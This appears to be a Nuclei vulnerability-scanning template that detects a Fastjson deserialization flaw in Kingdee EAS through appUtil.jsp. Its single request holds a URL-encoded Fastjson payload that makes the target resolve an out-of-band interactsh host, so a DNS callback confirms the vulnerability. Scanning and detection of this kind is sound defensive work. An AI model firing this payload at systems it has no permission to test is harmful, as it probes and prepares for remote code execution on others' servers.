id: poc-kingdee-eas-apputil-fastjson-rce
info:
  name: Kingdee EAS appUtil.jsp Fastjson RCE
  author: ProjectDiscoveryAI
  severity: critical
  tags: dnslog, deserialization
http:
  - raw:
      - |
        GET /easportal/tools/appUtil.jsp?list=%7B%22x%22%3A%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22{{interactsh-url}}%22%7D%7D HTTP/1.1
        Host: {{Hostname}}
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "om.alibaba.fastjson.JSONObject"
        part: body
      - type: word
        words:
          - "dns"
        part: interactsh_protocol
